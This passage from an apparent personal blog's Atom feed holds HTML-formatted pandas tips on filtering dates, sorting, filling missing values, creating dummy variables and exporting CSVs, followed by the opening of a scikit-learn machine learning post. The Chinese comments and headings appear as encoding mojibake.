class="string">&#x27;DATA_DATE&#x27;</span>]&gt;=<span class="string">&#x27;2021-01-01&#x27;</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç»“æŸæ—¶é—´</span></span><br><span class="line">to_date = df[<span class="string">&#x27;DATA_DATE&#x27;</span>]&lt;=<span class="string">&#x27;2021-03-31&#x27;</span></span><br><span class="line"><span class="comment"># ç­›é€‰æ•°æ®æ—¶é—´æ®µ</span></span><br><span class="line">df = df[from_date&amp;to_date]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ—¥æœŸåŠ å‡ï¼š</span></span><br><span class="line">beg = end - pd.Timedelta(days=<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li>æ’åºé—®é¢˜</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># å…ˆæŒ‰ç€Aåˆ—çš„å€¼å‡åºï¼Œå†æŒ‰ç€Bçš„é¡ºåºé™åº</span></span><br><span class="line">df.sort_values([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>],ascending=[<span class="literal">True</span>,<span class="literal">False</span>])</span><br></pre></td></tr></table></figure><ul><li>å¯¹dfè¿›è¡Œè‡ªå®šä¹‰æ’åº</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ•°æ®é‡å°çš„æƒ…å†µ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># å°†ç´¢å¼•0å’Œç´¢å¼•3çš„é¡ºåºå¯¹è°ƒ</span></span><br><span class="line">indx = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="comment"># å¦‚æœindexè¿‡é•¿,å¯ä»¥é€šè¿‡.indexè·å–</span></span><br><span class="line">df.index</span><br><span class="line"><span class="comment"># ä½¿ç”¨reindexå®ç°</span></span><br><span class="line">df.reindex(indx)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ•°æ®é‡å¤§çš„æƒ…å†µ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#df[1:3] = df[3:1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index ç´¢å¼•é‡æ’åº</span></span><br><span class="line">frame.swaplevel(<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>)</span><br><span class="line"><span class="comment"># å¯¹å¤šä¸ªç´¢å¼•æ’åºï¼ŒæŒ‰ç…§åç§°</span></span><br><span class="line">frame.sort_index(level=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æŒ‰ç…§ç´¢å¼•å€¼æ’åº</span></span><br><span class="line">frame.sort_index()</span><br></pre></td></tr></table></figure><h2><span id="ä¿å­˜æ–‡ä»¶">ä¿å­˜æ–‡ä»¶</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸ä¿å­˜ç´¢å¼•</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># ä¿å­˜æŒ‡å®šåˆ—</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># å°æ•°ç‚¹</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="tricks">Tricks</span></h2><ul><li>å¼‚å¸¸å€¼åˆ†æ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ˆçœ‹æ•°æ®ï¼Œåé¢na_valuesåæœŸå¡«å†™</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;xx.csv&#x27;</span>,na_values=[])</span><br><span class="line"><span class="comment"># æ¯ä¸ªcolå»çœ‹å®ƒçš„unique()å€¼æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼Œå¦‚æœæœ‰å°±æ·»åŠ åˆ°na_valuesä¸­</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> df.columns:</span><br><span class="line">  <span class="built_in">print</span>(df[c].unique())</span><br><span class="line"><span class="comment"># ä½¿ç”¨headå’ŒinfoæŸ¥çœ‹æ•°æ® æ•°å€¼å‹çš„æ•°æ®</span></span><br><span class="line">df.head()</span><br><span class="line">df.info()</span><br><span class="line"><span class="comment"># å¦‚æœå‘ç°æ•°å€¼æ•°æ®å´æ˜¯objectç±»å‹ï¼Œåˆ™è½¬ä¸ºint/float</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;int&#x27;</span>)</span><br><span class="line"><span class="comment"># å¦‚æœæç¤ºé”™è¯¯ï¼Œåˆ™å¯ä»¥ä»é”™è¯¯æç¤ºä¸­æ‰¾åˆ°éæ³•å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯éœ€è¦ æ¡ä»¶æ›¿æ¢çš„æ—¶å€™</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    mean = df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)].mean()</span><br><span class="line">    indx = df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>].index.tolist()</span><br><span class="line">    df.loc[indx,<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment"># å†™æˆè¿™æ ·ä¸è¡Œ å› ä¸ºå–ä¸åˆ°å¼•ç”¨</span></span><br><span class="line">    df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment">#ä½¿ç”¨locå¯ä»¥å– ä½†æ˜¯[]ä¸è¡Œ</span></span><br><span class="line">    <span class="built_in">print</span>(df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)].shape)</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®åˆ†æ&amp;å¤„ç†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># è®¡ç®—ç¼ºå¤±å€¼</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æ¯åˆ—æœ‰å¤šå°‘ç¼ºå¤±å€¼</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç¼ºå¤±å€¼</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨æ•´åˆ—çš„å‡å€¼è¿›è¡Œå¡«å……mean mode median</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># ç°åœ¨å°†è¯„åˆ†åˆ—çš„ç¼ºå¤±å€¼ï¼Œæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªç”µå½±çš„è¯„åˆ†</span></span><br><span class="line">df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>] = df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨ä¸Šä¸‹æ•°å­—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># åœ¨å¡«å…… â€œè¯­è¨€â€ åˆ—çš„ç¼ºå¤±å€¼ï¼Œè¦æ±‚æ ¹æ® â€œå›½å®¶/åœ°åŒºâ€ åˆ—çš„å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯­è¨€&#x27;</span>]=df.groupby(<span class="string">&#x27;å›½å®¶/åœ°åŒº&#x27;</span>).è¯­è¨€.bfill()</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾æŒ‡å®šåˆ—çš„é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;ç‰‡å&#x27;</span>])]</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼ï¼Œä½†ä¿ç•™æœ€åä¸€æ¬¡å‡ºç°çš„å€¼first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®—å„çœå¸‚å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">df.çœå¸‚.value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fillna ä¼ å­—å…¸</span></span><br><span class="line">pretreat=pretreat.fillna(&#123;<span class="string">&#x27;v_0&#x27;</span>:df_mean.v_0,</span><br><span class="line">          <span class="string">&#x27;v_1&#x27;</span>:df_mean.v_1,</span><br><span class="line">          <span class="string">&#x27;v_2&#x27;</span>:df_mean.v_2,</span><br><span class="line">          <span class="string">&#x27;v_3&#x27;</span>:df_mean.v_3,</span><br><span class="line">          <span class="string">&#x27;v_4&#x27;</span>:df_mean.v_4,</span><br><span class="line">          <span class="string">&#x27;v_5&#x27;</span>:df_mean.v_5,</span><br><span class="line">          <span class="string">&#x27;v_6&#x27;</span>:df_mean.v_6,</span><br><span class="line">          <span class="string">&#x27;v_7&#x27;</span>:df_mean.v_7,</span><br><span class="line">           <span class="string">&#x27;v_8&#x27;</span>:df_mean.v_8,</span><br><span class="line">          <span class="string">&#x27;v_9&#x27;</span>:df_mean.v_9,</span><br><span class="line">          <span class="string">&#x27;v_10&#x27;</span>:df_mean.v_10,</span><br><span class="line">          <span class="string">&#x27;v_11&#x27;</span>:df_mean.v_11,</span><br><span class="line">          <span class="string">&#x27;v_12&#x27;</span>:df_mean.v_12,</span><br><span class="line">          <span class="string">&#x27;v_13&#x27;</span>:df_mean.v_13,</span><br><span class="line">          <span class="string">&#x27;v_14&#x27;</span>:df_mean.v_14</span><br><span class="line">          &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dropna: axis=1åˆ é™¤åˆ—ï¼Œaxis=0åˆ é™¤è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åˆ é™¤æ•´è¡Œç¼ºå¤±çš„æ•°æ®ï¼Œå‰©ä½™ç¼ºå¤±æ•°æ®æŒ‰0å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤æŸåˆ—ä¸ºç©ºçš„è¡Œ</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;å®¢æˆ·ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>å“‘å˜é‡æ“ä½œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å“‘å˜é‡æ“ä½œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist() </span><br><span class="line"><span class="comment"># æˆ–è€…è‡ªå·±æŒ‡å®šæƒ³è¦æˆä¸ºå“‘å˜é‡çš„åˆ—</span></span><br><span class="line">cate = [<span class="string">&#x27;col1&#x27;</span>,<span class="string">&#x27;col2&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># è§£å†³intä¸èƒ½å“‘å˜é‡é—®é¢˜ï¼Œä¸€è¡Œsolution</span></span><br><span class="line">pd.get_dummies(df,columns=[<span class="string">&#x27;ç”¨ç”µç±»åˆ«&#x27;</span>,<span class="string">&#x27;ç”¨ç”µç±»åˆ«&#x27;</span>,<span class="string">&#x27;å¹´&#x27;</span>,<span class="string">&#x27;æœˆ&#x27;</span>]).info()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">data = pd.get_dummies(data)</span><br></pre></td></tr></table></figure><ul><li>ç»Ÿè®¡ç©ºå€¼</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨applyå®ç°</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,np.nan,np.nan],<span class="string">&#x27;B&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,np.nan]&#125;)</span><br><span class="line">df1.apply(<span class="keyword">lambda</span> x:x.size - x.count())</span><br><span class="line"><span class="comment"># ä½¿ç”¨isnaã€isnullå®ç°</span></span><br><span class="line">df1.isna().<span class="built_in">sum</span>() <span class="comment">#isna()è¿”å›çš„æ˜¯ä¸ªboolç±»å‹çš„çŸ©é˜µï¼Œè¿›è¡ŒåŠ å’Œè¿ç®—Trueé»˜è®¤ä¸º1ï¼ŒFalseé»˜è®¤ä¸º0ï¼Œå› æ­¤å¯ä»¥é€šè¿‡sum()å‡½æ•°æ¥ç»Ÿè®¡</span></span><br><span class="line"><span class="comment"># ç»Ÿè®¡æ¯ä¸ªç©ºå€¼çš„æ¯”ä¾‹</span></span><br><span class="line">df1.isna().mean() <span class="comment"># mean() ç›¸å½“äº Trueçš„ä¸ªæ•°/sum()çš„ä¸ªæ•°</span></span><br></pre></td></tr></table></figure><ul><li>è®¡ç®—æœ€è¿‘çš„æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡absæ¥è®¡ç®—è·ç¦»ï¼Œç„¶åé€šè¿‡sort_valuesæ¥ç®—æœ€å°çš„æ•°</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x:<span class="built_in">abs</span>(x-<span class="number">1</span>)).sort_values()</span><br></pre></td></tr></table></figure><h2><span id="matplotlib">matplotlib</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fig,axis = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2><span id="tips">Tips</span></h2><h3><span id="å±è”½æé†’">å±è”½æé†’</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ˜¾ç¤ºä¸­æ–‡">æ˜¾ç¤ºä¸­æ–‡</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># winè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># macè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br></pre></td></tr></table></figure><h3><span id="å…³äºilocå’Œé€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜">å…³äºilocå’Œ[]é€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] å–å‡ºæ•°å­—ï¼Œä¸èƒ½èµ‹å€¼</span><br><span class="line">df.loc[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">df.iloc[<span class="number">10</span>,<span class="number">1</span>]</span><br><span class="line">df.iloc[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">df.iloc[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line">å’Œ</span><br><span class="line">df[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;å‡ä¸èƒ½æ”¹å˜åŸdf</span></span><br><span class="line"><span class="string">å› ä¸ºä»–ä»¬ä»…ä»…æ˜¯å–å‡ºæ¥çš„å€¼ï¼Œè€Œä¸æ˜¯å¼•ç”¨&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»™ä¸€ä¸ªSeriesèµ‹å€¼å¦å¤–ä¸€ä¸ªSerieséœ€è¦reset_index() ï¼ˆä¿è¯indexç›¸åŒï¼‰</span></span><br></pre></td></tr></table></figure><ul><li>Jupyter</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># æ˜¾ç¤ºå¸®åŠ©</span></span><br><span class="line">np.add?? <span class="comment"># æ˜¾ç¤ºæºä»£ç </span></span><br><span class="line"><span class="comment"># fstingç”¨æ³• python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="pandas" scheme="https://disda-coding.github.io/categories/pandas/"/>
    
    
    <category term="å¤§æ•°æ®" scheme="https://disda-coding.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ åŸºç¡€</title>
    <link href="https://disda-coding.github.io/2022/03/07/MachineLearning/"/>
    <id>https://disda-coding.github.io/2022/03/07/MachineLearning/</id>
    <published>2022-03-07T09:22:02.000Z</published>
    <updated>2023-03-29T01:03:30.404Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">ç®—æ³•æ€»ç»“</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E5%88%86%E7%B1%BB">åˆ†ç±»</a><ul><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">å›å½’æ ‘</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">éšæœºæ£®æ—</a></li><li><a href="#%E6%A2%AF%E5%BA%A6%E6%8F%90%E5%8D%87%E6%A3%AE%E6%9E%97">æ¢¯åº¦æå‡æ£®æ—</a></li><li><a href="#svc%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E9%9C%80%E8%A6%81%E6%A0%87%E5%87%86%E5%8C%96-%E6%89%BE%E5%B0%91%E6%95%B0%E7%B1%BB%E7%9B%B8%E5%AF%B9%E6%93%85%E9%95%BF">SVC(æ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–) æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿</a></li><li><a href="#%E5%88%86%E7%B1%BBonekey">åˆ†ç±»OneKey</a></li><li><a href="#%E5%88%86%E7%B1%BB%E8%B0%83%E5%8F%82onekey">åˆ†ç±»è°ƒå‚Onekey</a></li></ul></li><li><a href="#%E6%A8%A1%E6%9D%BF">æ¨¡æ¿</a><ul><li><a href="#%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B">æ³°å¦å°¼å…‹</a></li><li><a href="#%E8%B0%83%E4%BC%98">è°ƒä¼˜</a></li><li><a href="#ridge">Ridge</a></li><li><a href="#lasso">Lasso</a></li><li><a href="#%E5%A4%9A%E6%AD%A5%E9%95%BF%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97">å¤šæ­¥é•¿æ—¶é—´åºåˆ—</a></li></ul></li><li><a href="#%E8%B8%A9%E5%9D%91">è¸©å‘</a></li><li><a href="#trick">Trick</a></li></ul><!-- tocstop --><h2><span id="ç®—æ³•æ€»ç»“">ç®—æ³•æ€»ç»“</span></h2><table><thead><tr><th>åˆ†ç±»</th><th>å›å½’</th></tr></thead><tbody><tr><td>åˆ†ç±»æ ‘<strong>tree.DecisionTreeClassififier</strong></td><td>å›å½’æ ‘<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>éšæœºæ£®æ—<strong>ensemble.RandomForestClassifier</strong></td><td>å›å½’æ£®æ—<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>é€»è¾‘å›å½’<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>æ¢¯åº¦æå‡æ ‘<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td>SVC <strong>svm.SVC</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X, Y, test_size=<span class="number">0.3</span>,random_state=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ä¸å¯¹åˆ†ç±»å‹å˜é‡åšæ— é‡çº²åŒ–å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 